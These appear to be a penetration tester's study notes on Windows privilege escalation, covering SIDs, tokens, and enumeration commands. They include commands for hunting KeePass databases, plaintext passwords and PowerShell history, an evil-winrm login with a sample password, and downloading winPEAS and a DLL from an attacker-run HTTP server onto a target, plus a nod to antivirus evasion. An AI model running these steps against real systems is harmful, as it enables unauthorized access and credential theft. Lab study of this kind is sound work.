          Well Known SIDs
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator

Tokens describe the security context of a user
When a user starts a process / thread, they are assigned a primary token. This is a copy of the user's access token.

Impersonation tokens are used to give different contexts than the process that owns the thread.

When processes are started or objects are created, they receive the integrity level of the principal performing this operation. 
One exception is if an executable file has a low integrity level, the process's integrity level will also be low.

- System: SYSTEM (kernel, ...)
- High: Elevated users
- Medium: Standard 
- Low: very restricted rights often used in sandboxed

### Situational Awareness

Key Information for Windows privilege escalation
-Username and hostname
  whoami - you can infer data from hostname such as WEB01 for a web server or MSSQL01
  
- Group memberships of the current user
  whoami /groups
  
- Existing users and groups
  net user OR Powershell -> Get-LocalUser - list all users
  
  for groups keep an eye on things like helpdesk, backup, administrator, etc... rdp's pretty important too.
  net localgroup OR Get-LocalGroup -> List all groups
  Get-LocalGroupMember <groupnam> - List all users of group
  
- Operating system, version and architecture
  systeminfo

- Network information
  ipconfig /all
    is dhcp enabled? Is there a dns server? Is there a subnetmask or mac address?
    
  route print
  
  netstat -ano
    -a to display all active TCP connections as well as TCP and UDP ports, -n to disable name resolution, and -o to show the process ID for each connection.
  
- Installed applications
  show all x32 apps
  Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
  
  show all x64 apps
   Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
   
   ```mystuff
   NOTE: These paths only work if the apps properly register themselves... If you can't find anything, try this...
   "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths"
   : This path contains information about application executable paths.
   
   "HKCR\Installer\Products"
   : This path contains information about installed products as recorded by the Windows Installer.```
  
  Or just check Program Files in C:\
  
- Running processes
          
  Get-Process
  
  ```my stuff
          
  Get-Process | Select-Object Name, Id, Path, Company, IntegrityLevel -- Integrity didn't show for me.. maybe it needs admin perms to show
  
  search by pid
          
  Get-Process | Where-Object { $_.Id -eq <PID> } | Select-Object Name, Id, Path
  
  search by processname
          
  Get-Process | Where-Object { $_.Name -eq "process_name" }
  
  search by name with wildcard
          
  Get-Process | Where-Object { $_.Name -like "*myapp*" }
  ```
 
 ### Hidden in plain sight
       
Find password DB for keePass. Obviously for other password managers, this needs to be changed
          
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
          
Find config files that may have passwords in plain text...
          
 Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
          

          
 ### Information Gold Mine
          
 Get-History
 (Get-PSReadlineOption).HistorySavePath
          
 alternatively
          
 type $((Get-PSReadlineOption).HistorySavePath)

PowerShell Remoting by default uses WinRM for Cmdlets such as Enter-PSSession. Therefore, a user needs to be in the local group Windows Management Users to be a valid user for these Cmdlets. However, instead of WinRM, SSH can also be used for PowerShell remoting.
          
Kali - login using winrm (NOTE SPECIAL CHARS MAY NEED TO BE ESCAPED)
          
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"

          
If RDP is annoying try this..
xfreerdp /u:USER /p:'PASSWORD' /v:$target /cert-ignore /w:1366 /h:768
          
xfreerdp /u:daveadmin /p:'mypassword' /v:'192.168.208.220' /cert-ignore /w:1366 /h:768
          
Search for event 4104 to see ScriptBlockLog events
         
### automation
 winPeas... serve it up to target using 
          
python3 -m http.server 80
          
then on target download using

iwr -uri http://192.168.45.230/winPEASx64.exe -Outfile winPEAS.exe
Start-Process -FilePath "winPEAS.exe" -RedirectStandardOutput "winlog.txt" -NoNewWindow -WindowStyle Hidden
# CMD
start /B cmd /C "winPEAS.exe > winPEAS.txt"
Get-Content winPEAS.txt | Out-Host -Paging

          
from INE I learned about using
 iwr -UseBasicParsing -Uri http://IP/Dwrite.dll -OutFile C:\Users\Administrator\Desktop\dvta\bin\Release\Dwrite.dll
          
** automated tools can be blocked by AV solutions. If this is the case, we can apply techniques learned in the Module "Antivirus Evasion", try other tools such as Seatbelt2 and JAWS,3 or do the enumeration manually.
          
winPeas misses things... don't forget manual enumeration...
          
       

          
         






 A skilled penetration tester's goal is therefore not to blindly attempt privilege escalation on every machine at any cost,
 but to identify machines where privileged access leads to further compromise of the client's infrastructure.
